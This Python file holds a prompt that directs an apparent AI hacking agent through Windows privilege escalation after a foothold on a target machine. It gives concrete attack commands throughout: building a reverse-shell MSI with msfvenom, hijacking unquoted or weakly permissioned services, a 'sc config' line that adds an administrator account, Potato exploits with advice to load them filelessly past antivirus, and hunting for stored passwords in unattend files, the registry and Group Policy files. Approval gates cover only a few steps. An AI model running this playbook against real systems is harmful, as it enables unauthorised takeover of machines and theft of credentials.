"""Windows privilege escalation workflow prompt.

Used after initial foothold on a Windows box (RCE via web app, RDP as
low-priv, WinRM, etc.). Outputs structured enumeration plan; engine
correlates with sysinfo + winpeas output where available.
"""

WINDOWS_PRIVESC_PROMPT = """\
You have a low-priv shell on a Windows box. Goal: SYSTEM or
local Administrator. Work top-down. Stop at first viable path.

## 1. System fingerprint
```
whoami /all          (look for SeImpersonate, SeAssignPrimaryToken)
hostname
systeminfo           (OS build → kernel exploit lookup)
wmic qfe list brief  (installed patches → identify missing KBs)
```
Critical privilege-tokens:
- **SeImpersonatePrivilege** → Potato attacks (Juicy/Rogue/Print/Sweet)
- **SeAssignPrimaryTokenPrivilege** → similar
- **SeBackupPrivilege** → read SAM/SYSTEM hives → secretsdump
- **SeRestorePrivilege** → write to protected files
- **SeDebugPrivilege** → already SYSTEM-equivalent
- **SeTakeOwnershipPrivilege** → take any file's ACL

## 2. AlwaysInstallElevated (instant SYSTEM if both set)
```
reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
```
If both = 0x1 → `msfvenom -p windows/x64/shell_reverse_tcp ... -f msi -o evil.msi`
then `msiexec /quiet /qn /i evil.msi` → SYSTEM shell.

## 3. Unquoted service paths
```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\\\"
```
Look for executable paths with spaces NOT enclosed in quotes:
e.g. `C:\\Program Files\\Some App\\app.exe` → drop `Program.exe` in `C:\\`
that runs as the service user (often LocalSystem) on next start.

## 4. Weak service permissions
```
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
sc qc <service>          (check binPath)
sc query <service>       (check current state)
```
Look for SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS for non-admin user.
Modify binPath: `sc config <service> binPath= "cmd /c net user pwn Pwn123! /add && net localgroup administrators pwn /add"`

## 5. Writable service binaries
```
icacls "C:\\Path\\To\\service.exe"
```
If non-admin can write → replace binary, restart service.

## 6. Scheduled tasks
```
schtasks /query /fo LIST /v
```
Look for: tasks running as SYSTEM/admin, with binaries you can replace
or arguments you can hijack.

## 7. Token impersonation (SeImpersonate workflow)
If `whoami /priv` shows SeImpersonate enabled:
- Fresh box (Win10 1809-): `JuicyPotato.exe` (CLSID required)
- Modern (Win10 1809+ / Server 2019+): `RoguePotato.exe`,
  `PrintSpoofer.exe`, `SweetPotato.exe`
- Latest defenses: `GodPotato.exe` (works through Server 2022)

These are signature-detected — bring them in fileless if AV is present.

## 8. Stored credentials
```
cmdkey /list
runas /savecred /user:admin "cmd"      (if any)
dir C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\ 2>nul
dir C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\ 2>nul
```
Sysprep / unattend leftovers:
```
type C:\\Windows\\Panther\\Unattend.xml 2>nul
type C:\\Windows\\System32\\sysprep\\sysprep.xml 2>nul
type C:\\Windows\\System32\\sysprep\\sysprep.inf 2>nul
```
Group Policy Preferences (domain-joined):
```
findstr /S /I cpassword \\\\domain.local\\sysvol\\domain.local\\Policies\\*.xml
```

## 9. Registry secrets
```
reg query HKLM /f "password" /t REG_SZ /s 2>nul
reg query HKCU /f "password" /t REG_SZ /s 2>nul
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
   (look for DefaultUserName / DefaultPassword auto-logon)
```

## 10. Kernel exploit (last resort)
From `systeminfo`, get OS build + missing KBs.
Cross-reference with `kernel_exploits_db.lookup_windows(build, kbs)`.
Notable:
- KB4013389 missing on 2008-2016 → MS17-010 (EternalBlue)
- KB4467684 missing on 1803 → CVE-2018-8453 (Win32k)
- KB5005565 missing → PrintNightmare (CVE-2021-1675/34527)

## Output schema
{
  "step": "1-10",
  "command": "<exact PS / cmd>",
  "raw": "<output, 4KB max>",
  "findings": [{"type": "sei", "vector": "GodPotato"}],
  "next": "execute" | "continue" | "abort"
}

## Hard constraints
- No persistence (no scheduled task install, no service install) without
  approval gate.
- No defender disable / log clearing without explicit authorization.
- Kernel exploits / Potato variants require approval before execution
  (some are unreliable and crash boxes).
- Pulling NTDS.dit or SAM/SYSTEM hives is a credential-dump action —
  approval gate fires.
"""
